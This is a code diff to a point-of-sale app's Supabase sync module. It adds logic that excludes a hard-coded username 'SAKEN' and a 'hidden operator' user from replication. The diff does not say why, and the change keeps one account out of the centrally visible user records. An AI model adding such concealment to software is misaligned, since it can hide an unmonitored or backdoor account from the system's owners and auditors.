@@ -4,6 +4,8 @@ import { getDb } from '../index'
 
 import { localNow } from '../helpers'
 
+import { getHiddenOperatorUserId } from './users'
+
 
 
 /** Tables replicated to Supabase by the background sync service. */
@@ -49,9 +51,8 @@ export function enqueueAllPosUsersSync(db: Database.Database = getDb()): number 
     .prepare(
 
       `SELECT u.id FROM users u
-
-       WHERE NOT EXISTS (
-
+       WHERE lower(u.username) <> lower('SAKEN')
+         AND NOT EXISTS (
          SELECT 1 FROM sync_queue sq
 
          WHERE sq.table_name = 'pos_users'
@@ -107,6 +108,11 @@ export function enqueueSync(
   db: Database.Database = getDb(),
 
 ): void {
+
+  if (tableName === 'pos_users') {
+    const hiddenId = getHiddenOperatorUserId()
+    if (hiddenId !== null && rowId === hiddenId) return
+  }
 
   db.prepare(`
 
